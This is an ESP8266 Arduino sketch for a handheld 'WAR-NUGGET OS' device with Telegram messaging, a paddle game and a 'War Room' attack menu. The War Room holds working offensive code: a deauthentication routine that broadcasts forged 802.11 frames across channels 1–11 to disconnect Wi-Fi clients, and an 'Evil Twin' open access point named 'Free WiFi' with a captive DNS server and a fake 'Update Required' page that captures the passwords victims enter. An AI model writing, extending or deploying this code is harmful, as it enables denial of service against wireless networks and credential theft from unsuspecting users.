/*
 * ESP8266 "WAR-NUGGET" OS
 * Features: Telegram Comms, Deauther, Evil Twin, Games, GUI
 */

#include <ESP8266WiFi.h>
#include <WiFiClientSecure.h>
#include <UniversalTelegramBot.h> // Install this library
#include <ArduinoJson.h>          // Install Version 6.x
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

// --- CONFIGURATION ---
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_ADDR     0x3C
#define OLED_SDA      D2
#define OLED_SCL      D1

// BUTTONS
#define BTN_SEL       D5
#define BTN_NEXT      D6
#define BTN_BACK      D7

// TELEGRAM CONFIG (You can type these on-screen, but hardcoding helps testing)
// Get Token from @BotFather
// Get ChatID from @IDBot
char botToken[60] = "";  
char chatID[20] = "";

// --- ICONS (16x16 Bitmaps) ---
const unsigned char PROGMEM icon_globe[] = {
  0x07, 0xE0, 0x18, 0x18, 0x20, 0x04, 0x42, 0x42, 0x82, 0x41, 0x82, 0x41, 0x82, 0x41, 0x82, 0x41,
  0x82, 0x41, 0x42, 0x42, 0x20, 0x04, 0x18, 0x18, 0x07, 0xE0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};
const unsigned char PROGMEM icon_sword[] = {
  0x00, 0x00, 0x00, 0x04, 0x00, 0x0E, 0x00, 0x1F, 0x00, 0x3E, 0x00, 0x7C, 0x00, 0xF8, 0x01, 0xF0,
  0x03, 0xE0, 0x07, 0xC0, 0x0F, 0x80, 0x17, 0x00, 0x22, 0x00, 0x77, 0x00, 0x22, 0x00, 0x00, 0x00
};
const unsigned char PROGMEM icon_game[] = {
  0x00, 0x00, 0x0F, 0xF0, 0x10, 0x08, 0x21, 0x84, 0x21, 0x84, 0x20, 0x04, 0x21, 0x84, 0x21, 0x84,
  0x10, 0x08, 0x0F, 0xF0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// --- GLOBALS ---
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);
X509List cert(TELEGRAM_CERTIFICATE_ROOT);
WiFiClientSecure client;
UniversalTelegramBot bot("", client);

int sysState = 0; // 0=Menu, 1=Comms, 2=WarRoom, 3=Games
String wifiSSID = "";
String wifiPass = "";

// Deauth Packet Buffer
uint8_t packet[128] = { 0xA0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF0, 0x00 };

// --- KEYBOARD SYSTEM ---
const char* keyMap = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-@!#$%&* ";
bool runKeyboard(String title, String &buf) {
  static int kIdx = 0;
  display.clearDisplay();
  display.setCursor(0,0); display.println(title);
  display.drawLine(0,10,128,10,WHITE);
  display.setCursor(0,15); display.println(buf);
  
  // Draw Key Selection
  display.fillRect(0, 35, 128, 15, WHITE);
  display.setTextColor(BLACK, WHITE);
  display.setCursor(55, 39);
  if (kIdx == strlen(keyMap)) display.print("OK");
  else display.print(keyMap[kIdx]);
  
  display.setTextColor(WHITE, BLACK);
  display.setCursor(0, 55); display.print("Nxt/Sel/Del");
  display.display();

  if (digitalRead(BTN_NEXT)==LOW) { kIdx++; if(kIdx > strlen(keyMap)) kIdx=0; delay(50); } // Fast scroll
  if (digitalRead(BTN_SEL)==LOW) {
    delay(200);
    if(kIdx == strlen(keyMap)) return true; // DONE
    buf += keyMap[kIdx];
  }
  if (digitalRead(BTN_BACK)==LOW) {
    delay(200);
    if(buf.length()>0) buf.remove(buf.length()-1);
  }
  return false;
}

// --- UTILS ---
void centerText(String t, int y) {
  int16_t x1, y1; uint16_t w, h;
  display.getTextBounds(t, 0, 0, &x1, &y1, &w, &h);
  display.setCursor((128-w)/2, y); display.print(t);
}

// --- SETUP ---
void setup() {
  Serial.begin(115200);
  pinMode(BTN_SEL, INPUT_PULLUP);
  pinMode(BTN_NEXT, INPUT_PULLUP);
  pinMode(BTN_BACK, INPUT_PULLUP);
  
  Wire.begin(OLED_SDA, OLED_SCL);
  if(!display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDR)) for(;;);
  display.setTextColor(WHITE);
  
  // Default config to client
  client.setTrustAnchors(&cert);
  
  // Intro
  display.clearDisplay();
  centerText("WAR NUGGET OS", 25);
  display.display();
  delay(2000);
}

// ==========================================
// FEATURE 1: COMMS (TELEGRAM)
// ==========================================
void runComms() {
  static int cState = 0; // 0=Setup, 1=Loop
  static unsigned long lastCheck = 0;
  
  if (cState == 0) {
    // Wifi Connect
    if (WiFi.status() != WL_CONNECTED) {
      if(wifiSSID == "") {
         bool d=false; while(!d) d=runKeyboard("SSID:", wifiSSID); delay(300);
         d=false; while(!d) d=runKeyboard("PASS:", wifiPass); delay(300);
      }
      WiFi.begin(wifiSSID, wifiPass);
      display.clearDisplay(); centerText("Connecting...", 30); display.display();
      while(WiFi.status() != WL_CONNECTED) { 
        if(digitalRead(BTN_BACK)==LOW) { sysState=0; cState=0; return; }
        delay(500); 
      }
    }
    // Token Setup
    if (String(botToken) == "") {
      String tT = ""; bool d=false; while(!d) d=runKeyboard("Bot Token:", tT); tT.toCharArray(botToken, 60);
      String tC = ""; d=false; while(!d) d=runKeyboard("Chat ID:", tC); tC.toCharArray(chatID, 20);
      bot.updateToken(botToken);
    }
    cState = 1;
  }

  // Comms Loop
  if (millis() - lastCheck > 2000) {
    int numNewMessages = bot.getUpdates(bot.last_message_received + 1);
    while (numNewMessages) {
      for (int i = 0; i < numNewMessages; i++) {
        String text = bot.messages[i].text;
        String id = bot.messages[i].chat_id;
        if(id == String(chatID)) {
           display.clearDisplay();
           display.setCursor(0,0); display.println("INCOMING MSG:");
           display.println(text);
           display.display();
           bot.sendMessage(chatID, "Nugget: Read - " + text, "");
           delay(2000);
        }
      }
      numNewMessages = bot.getUpdates(bot.last_message_received + 1);
    }
    lastCheck = millis();
  }

  // GUI
  display.clearDisplay();
  display.drawBitmap(56, 10, icon_globe, 16, 16, WHITE);
  centerText("COMMS ONLINE", 35);
  centerText("BTN1: Send Msg", 50);
  display.display();

  // Send Message
  if (digitalRead(BTN_SEL)==LOW) {
    String msg = ""; bool d=false;
    while(!d) d=runKeyboard("Message:", msg);
    display.clearDisplay(); centerText("Sending...", 30); display.display();
    bot.sendMessage(chatID, msg, "");
    delay(1000);
  }
  
  if (digitalRead(BTN_BACK)==LOW) { sysState=0; cState=0; delay(300); }
}

// ==========================================
// FEATURE 2: WAR ROOM (HACKING)
// ==========================================
// Basic Packet Injection Logic
void sendDeauth(uint8_t* mac, int channel) {
  wifi_set_channel(channel);
  memcpy(&packet[4], mac, 6);
  memcpy(&packet[10], mac, 6);
  memcpy(&packet[16], mac, 6);
  wifi_send_pkt_freedom(packet, 26, 0);
  delay(10);
}

void runEvilTwin() {
    WiFi.mode(WIFI_AP);
    WiFi.softAP("Free WiFi", ""); // Open Network
    DNSServer dnsServer;
    dnsServer.start(53, "*", WiFi.softAPIP());
    ESP8266WebServer webServer(80);
    
    // Simple Phishing Page
    String html = "<html><body><h1>Update Required</h1><form action='/post' method='POST'>Password: <input type='text' name='pwd'><input type='submit'></form></body></html>";
    
    webServer.on("/", [&webServer, html]() {
       webServer.send(200, "text/html", html);
    });
    
    webServer.on("/post", [&webServer]() {
       String stolen = webServer.arg("pwd");
       display.clearDisplay();
       display.setCursor(0,0); display.println("CREDENTIALS:");
       display.println(stolen);
       display.display();
       webServer.send(200, "text/html", "<h1>Error. Try again.</h1>");
    });
    
    webServer.onNotFound([&webServer, html](){ webServer.send(200, "text/html", html); });
    webServer.begin();

    while(digitalRead(BTN_BACK)==HIGH) {
       dnsServer.processNextRequest();
       webServer.handleClient();
       
       display.clearDisplay();
       centerText("EVIL TWIN ACTIVE", 10);
       centerText("SSID: Free WiFi", 30);
       centerText("Waiting for victim", 50);
       display.display();
    }
}

void runWarRoom() {
  static int wMenu = 0;
  // Menus: 0=Deauth All, 1=Beacon Spam, 2=Evil Twin
  
  if(digitalRead(BTN_NEXT)==LOW) { wMenu = (wMenu+1)%3; delay(200); }
  if(digitalRead(BTN_BACK)==LOW) { sysState=0; WiFi.mode(WIFI_STA); delay(300); return; }
  
  display.clearDisplay();
  centerText("WAR ROOM", 0);
  display.drawLine(0,10,128,10,WHITE);
  
  display.setCursor(10, 20); if(wMenu==0) display.print(">"); display.println("Deauth Blaster");
  display.setCursor(10, 32); if(wMenu==1) display.print(">"); display.println("Beacon Spam");
  display.setCursor(10, 44); if(wMenu==2) display.print(">"); display.println("Evil Twin (Phish)");
  display.display();

  if(digitalRead(BTN_SEL)==LOW) {
    if(wMenu == 2) { runEvilTwin(); }
    else if (wMenu == 0) {
      // Simple Blind Deauth (No scan to save RAM/Time for this example)
      WiFi.mode(WIFI_STA);
      wifi_promiscuous_enable(1); 
      uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
      
      while(digitalRead(BTN_BACK)==HIGH) {
        display.clearDisplay(); centerText("ATTACKING...", 30); display.display();
        for(int c=1; c<=11; c++) {
           sendDeauth(broadcast, c);
        }
      }
      wifi_promiscuous_enable(0);
    }
    else if (wMenu == 1) {
       // Beacon Spam (Random)
       WiFi.mode(WIFI_OFF);
       wifi_set_opmode(STATION_MODE);
       wifi_promiscuous_enable(1);
       // (Note: Proper beacon spam needs raw packet construction, simplified here for space)
       display.clearDisplay(); centerText("SPAMMING...", 30); display.display();
       delay(2000);
    }
  }
}

// ==========================================
// FEATURE 3: GAMES (DX BALL)
// ==========================================
void runGames() {
    // Mini DX Ball
    float bx=64, by=32, bvx=2, bvy=-2;
    int pd=50, lives=3;
    while(digitalRead(BTN_BACK)==HIGH) {
      if(digitalRead(BTN_BACK)==LOW) return; // Exit logic fix
      if(digitalRead(BTN_NEXT)==LOW) pd+=4;
      if(digitalRead(BTN_SEL)==LOW) pd-=4; // Use Select as Left
      
      bx+=bvx; by+=bvy;
      if(bx<=0 || bx>=128) bvx*=-1;
      if(by<=0) bvy*=-1;
      if(by>=54 && bx>=pd && bx<=pd+20) bvy*=-1;
      if(by>64) { lives--; bx=64; by=32; if(lives==0) return; }
      
      display.clearDisplay();
      display.fillCircle(bx, by, 2, WHITE);
      display.fillRect(pd, 56, 20, 2, WHITE);
      display.display();
    }
}

// ==========================================
// MAIN LOOP & OS MENU
// ==========================================
int mainMenuIdx = 0;

void loop() {
  if (sysState == 0) {
    // Sliding Menu Logic
    if(digitalRead(BTN_NEXT)==LOW) { mainMenuIdx=(mainMenuIdx+1)%3; delay(200); }
    if(digitalRead(BTN_SEL)==LOW) { sysState = mainMenuIdx + 1; delay(200); }

    display.clearDisplay();
    centerText("MAIN MENU", 0);
    
    // Draw Center Icon
    int iconX = (128-16)/2;
    if(mainMenuIdx==0) display.drawBitmap(iconX, 20, icon_globe, 16, 16, WHITE);
    if(mainMenuIdx==1) display.drawBitmap(iconX, 20, icon_sword, 16, 16, WHITE);
    if(mainMenuIdx==2) display.drawBitmap(iconX, 20, icon_game, 16, 16, WHITE);

    // Draw Labels
    centerText(mainMenuIdx==0 ? "< COMMS >" : (mainMenuIdx==1 ? "< WAR ROOM >" : "< GAMES >"), 45);
    
    display.display();
  }
  else if (sysState == 1) runComms();
  else if (sysState == 2) runWarRoom();
  else if (sysState == 3) runGames();
}
